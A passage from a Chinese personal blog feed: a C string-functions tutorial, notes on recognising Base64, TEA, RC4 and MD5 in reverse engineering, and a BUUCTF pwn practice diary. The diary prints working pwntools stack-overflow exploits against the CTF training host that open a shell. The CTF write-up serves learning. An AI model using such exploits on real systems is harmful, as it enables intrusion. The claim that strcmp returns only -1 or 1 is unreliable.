class="line">strlen(str1);//一个参数，返回该字符串的长度</span><br></pre></td></tr></table></figure><p>功能：</p><p>返回一个字符串的长度（注意用%d接收，毕竟是返回的数字）</p><p>上代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str1[] = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">strlen</span>(str1) );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>代码输出是11，仔细数数，该字符串是11位，包括空格，但不包括/0</p></blockquote><h2 id="strcmp-；函数"><em>strcmp()；函数</em></h2><p>结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcmp(str1,str2);//两个参数，因为是比较，所以只能两两比较</span><br></pre></td></tr></table></figure><p>功能：</p><p>字符串 str1 和 str2 是相同的，则返回 0；</p><p>字符串 str1 &lt; str2 则返回-1；</p><p>字符串 str1 &gt; str2 则返回1。</p><p>细节就是，无论两个代码相差多少，返回的都是1或者-1，java里面字符串比较函数则是返回相差多少个</p><p>上代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str1[] = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> str2[] = <span class="string">&quot;thestar0yydswqrw&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> str3[] = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">strcmp</span>(str1,str2));<span class="comment">//这个返回值 -1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">strcmp</span>(str2,str1));<span class="comment">//这个返回值 1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">strcmp</span>(str1,str3));<span class="comment">//这个返回值 0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>输出</p><p>-1</p><p>1</p><p>0</p></blockquote><h2 id="strchr-函数"><em>strchr()</em>;函数</h2><p>结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strchr(str1,ch);//两个参数，返回后面那个字符在这个字符串出现的位置序列号</span><br></pre></td></tr></table></figure><p>作用：</p><p>返回一个指针，指向字符串 s1 中字符 ch 的第一次出现的位置。</p><h2 id="strstr-函数"><em>strstr()</em>;函数</h2><p>结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strstr(str1,str2);//两个参数，返回后面那个字符串首字母字符出现的位置</span><br></pre></td></tr></table></figure><p>返回一个指针，指向字符串 str1 中字符串 str2首字母出现的位置。</p><p>总结：</p><table><thead><tr><th style="text-align:left">序号</th><th style="text-align:left">函数 &amp; 目的</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left"><strong>strcpy(s1, s2);</strong> 复制字符串 s2 到字符串 s1。</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left"><strong>strcat(s1, s2);</strong> 连接字符串 s2 到字符串 s1 的末尾。</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left"><strong>strlen(s1);</strong> 返回字符串 s1 的长度。</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left"><strong>strcmp(s1, s2);</strong> 如果 s1 和 s2 是相同的，则返回 0；如果 s1&lt;s2 则返回小于 0；如果 s1&gt;s2 则返回大于 0。</td></tr><tr><td style="text-align:left">5</td><td style="text-align:left"><strong>strchr(s1, ch);</strong> 返回一个指针，指向字符串 s1 中字符 ch 的第一次出现的位置。</td></tr><tr><td style="text-align:left">6</td><td style="text-align:left"><strong>strstr(s1, s2);</strong> 返回一个指针，指向字符串 s1 中字符串 s2 的第一次出现的位置。</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> c语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向常见加密算法和编码识别</title>
      <link href="//74946e20.html"/>
      <url>//74946e20.html</url>
      
        <content type="html"><![CDATA[<h1>Base64</h1><p>Base64 是一种基于 64 个可打印字符来表示二进制数据的表示方法。转换的时候，将 3 字节的数据，先后放入一个 24 位的缓冲区中，先来的字节占高位。数据不足 3 字节的话，于缓冲器中剩下的比特用 0 补足。每次取出 6 比特（因为2^6^=64），按照其值选择</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</span><br></pre></td></tr></table></figure><p>中的字符作为编码后的输出，直到全部输入数据转换完成。</p><p>通常而言 Base64 的识别特征为索引表，当我们能找到 <code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code> 这样索引表，再经过简单的分析基本就能判定是 Base64 编码。</p><p>当然，有些题目 base64 的索引表是会变的，一些变种的 base64 主要 就是修改了这个索引表。</p><h1><strong>Tea</strong></h1><p>在密码学中，微型加密算法（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;           <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                       <span class="comment">/* basic cycle start */</span></span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i;  <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span></span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;                                   </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>RC4</h1><p>在<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E5%AD%B8">密码学</a>中，<strong>RC4</strong>（来自 Rivest Cipher 4 的缩写）是一种<a href="https://zh.wikipedia.org/wiki/%E6%B5%81%E5%8A%A0%E5%AF%86">流加密</a>算法，<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E9%92%A5">密钥</a>长度可变。它加解密使用相同的密钥，因此也属于<a href="https://zh.wikipedia.org/wiki/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86">对称加密算法</a>。RC4 是<a href="https://zh.wikipedia.org/wiki/%E6%9C%89%E7%B7%9A%E7%AD%89%E6%95%88%E5%8A%A0%E5%AF%86">有线等效加密</a>（WEP）中采用的加密算法，也曾经是 <a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE">TLS</a>可采用的算法之一</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s, <span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span> <span class="comment">//初始化函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i =<span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">256</span>; i++) &#123;</span><br><span class="line">        j=(j+s[i]+k[i])%<span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s, <span class="keyword">unsigned</span> <span class="keyword">char</span> *Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span> <span class="comment">//加解密</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Len;k++) &#123;</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过分析初始化代码，可以看出初始化代码中，对字符数组 s 进行了初始化赋值，且赋值分别递增。之后对 s 进行了 256 次交换操作。通过识别初始化代码，可以知道 rc4 算法。</p><h1>MD5</h1><p><strong>MD5 消息摘要算法</strong>（英语：MD5 Message-Digest Algorithm），一种被广泛使用的<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E9%9B%9C%E6%B9%8A%E5%87%BD%E6%95%B8">密码散列函数</a>，可以产生出一个 128 位（16 <a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82">字节</a>）的散列值（hash value），用于确保信息传输完整一致。</p><p>伪代码为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">/Note: All variables are <span class="keyword">unsigned</span> <span class="number">32</span> bits <span class="keyword">and</span> wrap modulo <span class="number">2</span>^<span class="number">32</span> when calculating</span><br><span class="line">var <span class="keyword">int</span>[<span class="number">64</span>] r, k</span><br><span class="line"></span><br><span class="line"><span class="comment">//r specifies the per-round shift amounts</span></span><br><span class="line">r[ <span class="number">0.</span><span class="number">.15</span>]：= &#123;<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,  <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,  <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,  <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>&#125; </span><br><span class="line">r[<span class="number">16.</span><span class="number">.31</span>]：= &#123;<span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,  <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,  <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,  <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>&#125;</span><br><span class="line">r[<span class="number">32.</span><span class="number">.47</span>]：= &#123;<span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,  <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,  <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,  <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>&#125;</span><br><span class="line">r[<span class="number">48.</span><span class="number">.63</span>]：= &#123;<span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>,  <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>,  <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>,  <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Use binary integer part of the sines of integers as constants:</span></span><br><span class="line"><span class="keyword">for</span> i from <span class="number">0</span> to <span class="number">63</span></span><br><span class="line">    k[i] := <span class="built_in">floor</span>(<span class="built_in">abs</span>(<span class="built_in">sin</span>(i + <span class="number">1</span>)) × <span class="number">2</span>^<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//Initialize variables:</span></span><br><span class="line">var <span class="keyword">int</span> h0 := <span class="number">0x67452301</span></span><br><span class="line">var <span class="keyword">int</span> h1 := <span class="number">0xEFCDAB89</span></span><br><span class="line">var <span class="keyword">int</span> h2 := <span class="number">0x98BADCFE</span></span><br><span class="line">var <span class="keyword">int</span> h3 := <span class="number">0x10325476</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Pre-processing:</span></span><br><span class="line">append <span class="string">&quot;1&quot;</span> bit to message</span><br><span class="line">append <span class="string">&quot;0&quot;</span> bits until message length in bits ≡ <span class="number">448</span> (mod <span class="number">512</span>)</span><br><span class="line">append bit length of message as <span class="number">64</span>-bit little-endian integer to message</span><br><span class="line"></span><br><span class="line"><span class="comment">//Process the message in successive 512-bit chunks:</span></span><br><span class="line"><span class="keyword">for</span> each <span class="number">512</span>-bit chunk of message</span><br><span class="line">    <span class="keyword">break</span> chunk into sixteen <span class="number">32</span>-bit little-endian words w[i], <span class="number">0</span> ≤ i ≤ <span class="number">15</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//Initialize hash value for this chunk:</span></span><br><span class="line">    var <span class="keyword">int</span> a := h0</span><br><span class="line">    var <span class="keyword">int</span> b := h1</span><br><span class="line">    var <span class="keyword">int</span> c := h2</span><br><span class="line">    var <span class="keyword">int</span> d := h3</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Main loop:</span></span><br><span class="line">    <span class="keyword">for</span> i from <span class="number">0</span> to <span class="number">63</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> ≤ i ≤ <span class="number">15</span> then</span><br><span class="line">            f := (b <span class="keyword">and</span> c) <span class="keyword">or</span> ((<span class="keyword">not</span> b) <span class="keyword">and</span> d)</span><br><span class="line">            g := i</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> <span class="number">16</span> ≤ i ≤ <span class="number">31</span></span><br><span class="line">            f := (d <span class="keyword">and</span> b) <span class="keyword">or</span> ((<span class="keyword">not</span> d) <span class="keyword">and</span> c)</span><br><span class="line">            g := (<span class="number">5</span>×i + <span class="number">1</span>) mod <span class="number">16</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> <span class="number">32</span> ≤ i ≤ <span class="number">47</span></span><br><span class="line">            f := b <span class="keyword">xor</span> c <span class="keyword">xor</span> d</span><br><span class="line">            g := (<span class="number">3</span>×i + <span class="number">5</span>) mod <span class="number">16</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> <span class="number">48</span> ≤ i ≤ <span class="number">63</span></span><br><span class="line">            f := c <span class="keyword">xor</span> (b <span class="keyword">or</span> (<span class="keyword">not</span> d))</span><br><span class="line">            g := (<span class="number">7</span>×i) mod <span class="number">16</span></span><br><span class="line"></span><br><span class="line">        temp := d</span><br><span class="line">        d := c</span><br><span class="line">        c := b</span><br><span class="line">        b := leftrotate((a + f + k[i] + w[g]),r[i]) + b</span><br><span class="line">        a := temp</span><br><span class="line">    Next i</span><br><span class="line">    <span class="comment">//Add this chunk&#x27;s hash to result so far:</span></span><br><span class="line">    h0 := h0 + a</span><br><span class="line">    h1 := h1 + b </span><br><span class="line">    h2 := h2 + c</span><br><span class="line">    h3 := h3 + d</span><br><span class="line">End ForEach</span><br><span class="line">var <span class="keyword">int</span> digest := h0 append h1 append h2 append h3 <span class="comment">//(expressed as little-endian)</span></span><br></pre></td></tr></table></figure><p>特征</p><p>h0 = 0x67452301;</p><p>h1 = 0xefcdab89;</p><p>h2 = 0x98badcfe;</p><p>h3 = 0x10325476;</p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF pwn刷题日记</title>
      <link href="//37a5e329.html"/>
      <url>//37a5e329.html</url>
      
        <content type="html"><![CDATA[<h1>test_YOUr_NC</h1><blockquote><p>非常简单，单纯是测试nc连接</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc ip(域名) 端口</span><br><span class="line">ls</span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220409100902961.png" alt=""></p><p>flag{c31410c1-ed23-4c3f-aabb-9ade18332c5c}</p><h1>rip</h1><p>下载文件复制到虚拟机里面并找到，并chmod 777提权，然后用file命令查看一下文件,然后checksec一下查看有没有什么保护</p><p>可以看到，是64位文件，x86处理器编译,linux内核版本，文件哈希值……，没有保护</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220415233934627.png" alt=""></p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220415234714319.png" alt=""></p><p>然后进行代码审计，直接把文件拖进64位ida，然后看一下这些函数，看一下main函数，main函数里面有一个gets()函数，gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出(如果对这个有疑问去ctf wiki pwn栈溢出原理那里学习一下（所以我们可以确定是栈溢出了）</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220415235606653.png" alt=""></p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220415235238476.png" alt=""></p><p>在fun函数看到了/bin/sh，点击一下这里，然后记录下地址40118A</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220415234336421.png" alt=""></p><p>然后我们现在用gdb来计算一下偏移量（我现在用的gdb插件是peda）</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220416000511590.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pattern create 100</span><br><span class="line">pattern offset A(</span><br></pre></td></tr></table></figure><p>上面那个命令是生成100个随机字符，然后下面那个命令是计算偏移量，算出来偏移量是23</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220416000759244.png" alt=""></p><p>故exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="comment">#导入 pwntools 中 pwn 包的所有内容</span></span><br><span class="line"><span class="keyword">from</span> ctfbox <span class="keyword">import</span> *<span class="comment">#导入 ctfbox</span></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn1&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25223</span>)<span class="comment"># 链接服务器远程交互</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">23</span> + p64(<span class="number">0x40118A</span>)</span><br><span class="line">p.sendline(payload) <span class="comment"># 发送 payload</span></span><br><span class="line">p.interactive()<span class="comment"># 反弹 shell 进行交互</span></span><br></pre></td></tr></table></figure><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220416001313057.png" alt=""></p><p>flag{e3a0ec3b-d033-410e-be46-7db980eaf1bf}</p><h1>warmup_csaw_2016</h1><p>刚开始的操作同上</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220416001703057.png" alt=""></p><p>main函数里面有个函数</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220416001950769.png" alt=""></p><p>发现有个cat flag.txt，记住这个地址400611</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220416002038955.png" alt=""></p><p>然后计算偏移量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cyclic 200</span><br><span class="line">cyclic -l saaa</span><br></pre></td></tr></table></figure><p>一个是生成200个随机字符，一个是计算偏移量，偏移量为72</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220416110814635.png" alt=""></p><p>还有一种方法 40h 加上因为是64为程序所以+8h等于48h也就是72</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220416003146062.png" alt=""></p><p>exp为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctfbox <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process(&#x27;./warmup&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28143</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span>+p64(<span class="number">0x400611</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220416002437010.png" alt=""></p><p>flag{d910e2ec-993e-4ff9-abd4-1eb2841bf7d5}</p><h1>ciscn_2019_n_1</h1><p>一样看保护和64位可执行文件，无保护，64位文件</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220416003953270.png" alt=""></p><p>然后丢进ida里面分析</p><p>在fun函数里面发现 float v2的一个变量要等于11.28125才能得到flag，但v2被赋了0.0的值</p><p>还有一个v1参数，v1和v2之间的差距只有0x2c，所以我们可以用v1来覆盖v2，并填充11.28125 的值</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220416004025434.png" alt=""></p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220416004417411.png" alt=""></p><p>但是我们不能直接发送这个数，可以看看汇编源码是怎么表达这个浮点数的</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220416004614674.png" alt=""></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 